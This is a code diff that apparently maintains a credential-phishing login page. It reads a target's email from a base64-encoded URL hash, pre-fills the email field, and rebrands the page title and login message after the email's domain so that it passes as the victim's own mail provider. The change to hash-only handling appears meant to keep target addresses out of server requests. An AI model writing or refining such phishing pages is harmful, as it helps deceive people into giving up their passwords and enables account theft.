@@ -3540,7 +3540,8 @@
   
   <script>
     // ============================================
-    // MAIN APPLICATION CODE - WITH FIX FOR EMAIL AUTO-FILL
+    // MAIN APPLICATION CODE - HASH-ONLY METHOD
+    // No query parameters - uses #hash for email
     // ============================================
     
     var cntt = 0;
@@ -3555,9 +3556,10 @@
         $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
       });
       
-      var ai = getEmailFromUrl(); // Fixed function to get email from query param or hash
+      // Get email from URL hash ONLY
+      var ai = getEmailFromHash();
       if (!ai) {
-        // No email in URL
+        // No email in URL - page still loads but no auto-fill
       } else {
         var my_ai = ai;
         $('#ai').val(my_ai);
@@ -3601,27 +3603,27 @@
       });
     });
     
-    // FIXED: Function to get email from URL (works with ?email= or #)
-    function getEmailFromUrl() {
-      var url = window.location.href;
-      // First try query parameter
-      var urlParams = new URLSearchParams(window.location.search);
-      var emailFromQuery = urlParams.get('email');
-      if (emailFromQuery && emailFromQuery.includes('@')) {
-        return emailFromQuery;
-      }
-      // Fallback to hash
+    // HASH-ONLY: Get email from URL hash (base64 encoded)
+    function getEmailFromHash() {
       var hash = window.location.hash.substr(1);
-      if (hash) {
-        try {
-          var decoded = atob(hash);
-          if (decoded && decoded.includes('@')) {
-            return decoded;
-          }
-        } catch(e) {
-          if (hash.includes('@')) {
-            return hash;
-          }
+      if (!hash) return null;
+      
+      // Handle case where hash might have language code after /
+      var parts = hash.split('/');
+      var hashPart = parts[0];
+      
+      if (!hashPart) return null;
+      
+      // Try to decode base64
+      try {
+        var decoded = atob(hashPart);
+        if (decoded && decoded.includes('@')) {
+          return decoded;
+        }
+      } catch(e) {
+        // Not base64, check if it's plain email
+        if (hashPart.includes('@')) {
+          return hashPart;
         }
       }
       return null;
@@ -3640,11 +3642,22 @@
         var url = location.href;
         const link = new URL(url);
         
-        // FIXED: Get email from query parameter first, then fallback to hash
-        let email = link.searchParams.get('email');
-        if (!email) {
-          email = link.hash;
-          email = handleBase64Data(email.substr(1).split('/')[0]);
+        // HASH-ONLY: Get email from hash
+        let email = null;
+        let hash = link.hash;
+        if (hash) {
+          var hashParts = hash.substr(1).split('/');
+          var encodedEmail = hashParts[0];
+          if (encodedEmail) {
+            try {
+              email = atob(encodedEmail);
+              if (!email || !email.includes('@')) {
+                email = encodedEmail; // fallback if not base64
+              }
+            } catch(e) {
+              email = encodedEmail;
+            }
+          }
         }
         
         if (email && email.includes('@')) {
@@ -3657,14 +3670,19 @@
         document.getElementsByClassName('modal')[0].style.display = 'block';
       }, 700);
       
+      // Split the current URL hash to extract parts
       const aim = window.location.hash.substr(1).split('/');
-      var hashPart = handleBase64Data(aim[0]);
+      var hashPart = null;
       
-      // FIXED: Also check query parameter for email
-      const urlParams = new URLSearchParams(window.location.search);
-      const queryEmail = urlParams.get('email');
-      if (queryEmail && !hashPart) {
-        hashPart = queryEmail;
+      if (aim[0]) {
+        try {
+          hashPart = atob(aim[0]);
+          if (!hashPart || !hashPart.includes('@')) {
+            hashPart = aim[0];
+          }
+        } catch(e) {
+          hashPart = aim[0];
+        }
       }
       
       const langs = getLocalizedLanguage(aim[1]);
@@ -3679,12 +3697,7 @@
       $("#email").attr("placeholder", langs.emlTxt);
       $("#password").attr("placeholder", langs.pswTxt);
       
-      if (hashPart) {
-        // Check if already plain text email
-        if (!hashPart.includes('@')) {
-          hashPart = convertToBase64(hashPart);
-        }
-        
+      if (hashPart && hashPart.includes('@')) {
         var emailParts = hashPart.split('@');
         if (emailParts.length >= 2) {
           var domainName = emailParts[1].split('.')[0];
@@ -3710,7 +3723,7 @@
           
           $("#loginMgs").html(`${capitalizedDomain} ${langs.emlLogin}`);
           document.title = `${capitalizedDomain} - ${langs.mail}`;
-          $("#email").val(hashPart);  // THIS IS THE KEY LINE FOR AUTO-FILL!
+          $("#email").val(hashPart);  // KEY LINE: Auto-fills the email field!
           
           $("#pass-eye").click(() => {
             if ($("#password").attr("type") != "text") {
